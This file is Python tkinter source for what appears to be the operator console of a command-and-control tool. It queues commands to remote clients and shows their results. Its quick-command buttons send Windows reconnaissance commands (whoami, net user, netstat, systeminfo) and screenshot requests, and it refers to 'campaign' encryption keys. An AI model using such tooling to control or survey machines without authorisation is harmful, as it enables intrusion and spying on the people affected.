import tkinter as tk
from tkinter import ttk, scrolledtext
import datetime

class ClientInteractionUI:
    """Handles the UI components for interactive command execution with clients"""
    
    def __init__(self, parent_frame, client_id, client_manager, logger):
        """
        Initialize the client interaction UI
        
        Args:
            parent_frame: The parent frame widget
            client_id: The unique identifier for the client
            client_manager: The client manager instance
            logger: Function for logging events
        """
        self.parent_frame = parent_frame
        self.client_id = client_id
        self.client_manager = client_manager
        self.logger = logger
        self.command_history = []
        self.command_index = 0
        
        self.create_widgets()
        
        # Register for command updates
        self.client_manager.register_command_update_callback(client_id, self.update_interaction_display)
    
    def create_widgets(self):
        """Create the widgets for the interaction UI"""
        # Main container frame
        self.main_frame = ttk.Frame(self.parent_frame)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a frame for the interactive console
        console_frame = ttk.LabelFrame(self.main_frame, text="Interactive Console")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create output display
        self.output_text = scrolledtext.ScrolledText(console_frame, wrap=tk.WORD, height=20, background="black", foreground="white")
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.output_text.config(state=tk.DISABLED)
        
        # Display welcome message
        self.append_output(f"--- Interactive session with client {self.client_id} ---\n")
        self.append_output("Type commands and press Enter to execute.\n")
        self.append_output("Use Up/Down arrow keys to navigate command history.\n\n")
        
        # Create input area with PS-like prompt
        input_frame = ttk.Frame(console_frame)
        input_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        # PS-like prompt label
        self.prompt_label = ttk.Label(input_frame, text="PS>", foreground="blue")
        self.prompt_label.pack(side=tk.LEFT)
        
        # Command input entry
        self.command_entry = ttk.Entry(input_frame, width=80)
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
        self.command_entry.focus_set()
        
        # Bind events
        self.command_entry.bind("<Return>", self.submit_command)
        self.command_entry.bind("<Up>", self.previous_command)
        self.command_entry.bind("<Down>", self.next_command)
        
        # Status indicators frame
        status_frame = ttk.Frame(console_frame)
        status_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        # Connection indicator
        self.connection_status = ttk.Label(status_frame, text="Connection: Active", foreground="green")
        self.connection_status.pack(side=tk.LEFT, padx=5)
        
        # Key rotation indicator
        self.key_status = ttk.Label(status_frame, text="Key: Default", foreground="orange")
        self.key_status.pack(side=tk.LEFT, padx=5)
        self.update_key_status()
        
        # Refresh button
        refresh_button = ttk.Button(status_frame, text="Refresh Status", command=self.update_key_status)
        refresh_button.pack(side=tk.RIGHT, padx=5)
        
        # Quick commands frame
        quick_cmd_frame = ttk.LabelFrame(self.main_frame, text="Quick Commands")
        quick_cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Row 1 of quick commands
        row1_frame = ttk.Frame(quick_cmd_frame)
        row1_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(row1_frame, text="whoami", width=15, command=lambda: self.send_command("whoami")).pack(side=tk.LEFT, padx=5)
        ttk.Button(row1_frame, text="systeminfo", width=15, command=lambda: self.send_command("systeminfo")).pack(side=tk.LEFT, padx=5)
        ttk.Button(row1_frame, text="ipconfig", width=15, command=lambda: self.send_command("ipconfig /all")).pack(side=tk.LEFT, padx=5)
        ttk.Button(row1_frame, text="tasklist", width=15, command=lambda: self.send_command("tasklist")).pack(side=tk.LEFT, padx=5)
        
        # Row 2 of quick commands
        row2_frame = ttk.Frame(quick_cmd_frame)
        row2_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        ttk.Button(row2_frame, text="netstat", width=15, command=lambda: self.send_command("netstat -ano")).pack(side=tk.LEFT, padx=5)
        ttk.Button(row2_frame, text="get users", width=15, command=lambda: self.send_command("net user")).pack(side=tk.LEFT, padx=5)
        ttk.Button(row2_frame, text="get drives", width=15, command=lambda: self.send_command("wmic logicaldisk get deviceid, volumename, description")).pack(side=tk.LEFT, padx=5)
        ttk.Button(row2_frame, text="screenshot", width=15, command=lambda: self.send_command("screenshot", command_type="screenshot")).pack(side=tk.LEFT, padx=5)
        
        # Row 3 of quick commands - Add key management commands
        row3_frame = ttk.Frame(quick_cmd_frame)
        row3_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        ttk.Button(row3_frame, text="Key Status", width=15, 
                  command=lambda: self.send_command("echo 'Checking key status...'", command_type="key_status")).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(row3_frame, text="Client Info", width=15,
                  command=lambda: self.send_command("Get-SystemIdentification", command_type="system_info")).pack(side=tk.LEFT, padx=5)
                  
        # Add a clear all pending commands button
        ttk.Button(row3_frame, text="Clear Pending", width=15,
                  command=self.clear_pending_commands).pack(side=tk.LEFT, padx=5)
                  
        # Add a reconnect button that refreshes the connection
        ttk.Button(row3_frame, text="Reconnect", width=15,
                  command=self.reconnect_client).pack(side=tk.LEFT, padx=5)
    
    def update_key_status(self):
        """Update the key status indicator based on client manager info"""
        has_unique_key = False
        client_id = self.client_id
        
        # Check if client has a unique key
        if hasattr(self.client_manager, 'has_unique_key'):
            has_unique_key = self.client_manager.has_unique_key(client_id)
        elif hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
            has_unique_key = True
        else:
            # Check if key_rotation_time exists in client info
            client_info = self.client_manager.get_clients_info().get(client_id, {})
            if 'key_rotation_time' in client_info:
                has_unique_key = True
        
        if has_unique_key:
            self.key_status.config(text="Key: Client-Specific", foreground="green")
        else:
            self.key_status.config(text="Key: Default", foreground="orange")
            
    def clear_pending_commands(self):
        """Clear all pending commands for this client"""
        if self.client_id:
            self.client_manager.clear_pending_commands(self.client_id)
            self.append_output("All pending commands cleared.\n")
            # Update the display
            self.update_interaction_display()
    
    def reconnect_client(self):
        """Force a client reconnection by requesting reregistration"""
        if self.client_id:
            self.send_command("echo 'Reconnection requested'", command_type="reconnect")
            self.append_output("Reconnection request sent to client.\n")
            self.connection_status.config(text="Connection: Reconnecting...", foreground="orange")
            # Schedule a status update after a short delay
            self.parent_frame.after(5000, self.update_key_status)
            self.parent_frame.after(5000, lambda: self.connection_status.config(text="Connection: Active", foreground="green"))
    
    def submit_command(self, event=None):
        """Submit the command when Enter is pressed"""
        command = self.command_entry.get().strip()
        if not command:
            return
        
        # Add to history
        if not self.command_history or self.command_history[-1] != command:
            self.command_history.append(command)
        self.command_index = len(self.command_history)
        
        # Display command
        self.append_output(f"PS> {command}\n")
        
        # Send command
        self.send_command(command)
        
        # Clear entry
        self.command_entry.delete(0, tk.END)
    
    def send_command(self, command, command_type="execute"):
        """Send a command to the client"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Add command to client manager
        self.client_manager.add_command(self.client_id, command_type, command)
        
        # Log it
        self.logger(f"Command {command_type} '{command}' sent to client {self.client_id}")
    
    def previous_command(self, event=None):
        """Navigate to previous command in history"""
        if not self.command_history:
            return "break"
        
        if self.command_index > 0:
            self.command_index -= 1
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, self.command_history[self.command_index])
        
        return "break"  # Prevent default behavior
    
    def next_command(self, event=None):
        """Navigate to next command in history"""
        if not self.command_history:
            return "break"
        
        if self.command_index < len(self.command_history) - 1:
            self.command_index += 1
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, self.command_history[self.command_index])
        elif self.command_index == len(self.command_history) - 1:
            # At the end of history, clear the entry
            self.command_index = len(self.command_history)
            self.command_entry.delete(0, tk.END)
        
        return "break"  # Prevent default behavior
    
    def append_output(self, text):
        """Append text to the output display"""
        self.output_text.config(state=tk.NORMAL)
        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)  # Scroll to the end
        self.output_text.config(state=tk.DISABLED)
    
    def update_interaction_display(self):
        """Update the interaction display with new command results"""
        try:
            # Add debug logging
            self.logger(f"Updating interaction display for client {self.client_id}")
            
            # Also update key status indicator
            self.update_key_status()
            
            history = self.client_manager.get_client_history(self.client_id)
            if not history:
                self.logger(f"No command history found for client {self.client_id}")
                return
            
            # Look for new results that haven't been displayed yet
            for command in history:
                try:
                    timestamp = command.get('timestamp', '')
                    command_type = command.get('command_type', 'unknown')
                    args = command.get('args', '')
                    
                    # Only process if it has a result and hasn't been displayed yet
                    if 'result' in command and 'displayed_in_interaction' not in command:
                        result = command.get('result', '')
                        
                        # Format the output with timestamp
                        formatted_time = timestamp.split()[1] if ' ' in timestamp else timestamp  # Just show time part
                        output = f"\n[{formatted_time}] Command result ({command_type}):\n"
                        output += "-" * 50 + "\n"
                        
                        # Handle different result formats and command types
                        if command_type == "key_rotation":
                            # Special formatting for key rotation results
                            output += "Key rotation command processed\n"
                            if isinstance(result, dict):
                                for key, value in result.items():
                                    output += f"{key}: {value}\n"
                            else:
                                output += str(result) + "\n"
                            output += "Note: Communication is now using a client-specific key\n"
                            
                            # Update key status indicator
                            self.update_key_status()
                        elif command_type == "key_status":
                            # Special formatting for key status results
                            if "key" in str(result).lower():
                                output += result + "\n"
                            else:
                                # Try to extract key info from system info
                                client_info = self.client_manager.get_clients_info().get(self.client_id, {})
                                if client_info and hasattr(self.client_manager, 'has_unique_key'):
                                    has_key = self.client_manager.has_unique_key(self.client_id)
                                    output += f"Using {'client-specific' if has_key else 'campaign default'} key\n"
                                else:
                                    output += "Using campaign default key\n"
                                output += result + "\n"
                        elif command_type == "system_info":
                            # Format system info nicely
                            if isinstance(result, dict):
                                for key, value in result.items():
                                    output += f"{key}: {value}\n"
                            else:
                                # Try to parse JSON string
                                try:
                                    import json
                                    info = json.loads(result)
                                    for key, value in info.items():
                                        output += f"{key}: {value}\n"
                                except:
                                    output += result + "\n"
                        else:
                            # Regular command result
                            output += result + "\n"
                            
                        output += "-" * 50 + "\n"
                        
                        # Append to display
                        self.append_output(output)
                        
                        # Mark as displayed
                        command['displayed_in_interaction'] = True
                except Exception as e:
                    self.logger(f"Error processing command result: {e}")
        except Exception as e:
            self.logger(f"Error updating interaction display: {e}")